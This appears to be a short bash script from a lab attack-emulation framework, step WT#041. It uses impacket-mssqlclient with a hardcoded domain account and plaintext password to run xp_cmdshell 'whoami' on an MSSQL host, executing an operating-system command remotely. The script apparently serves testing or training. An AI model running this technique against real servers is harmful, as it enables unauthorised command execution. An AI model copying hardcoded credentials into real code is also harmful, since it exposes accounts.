#!/bin/bash
# CADRE — WT#041 MSSQL xp_cmdshell
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#041 — MSSQL xp_cmdshell"
start_attack "041" "MSSQL xp_cmdshell"

require_tool impacket-mssqlclient
require_env MBR01 "MBR01"
require_env DOMAIN_CHILD "DOMAIN_CHILD"

step "Enable and execute xp_cmdshell via impacket-mssqlclient"
run_cmd "impacket-mssqlclient \"$DOMAIN_CHILD/analyst_t1:'T13r_An@lyst!'@$MBR01\" -windows-auth -query \"EXEC xp_cmdshell 'whoami'\""

result $? "MSSQL xp_cmdshell completed"
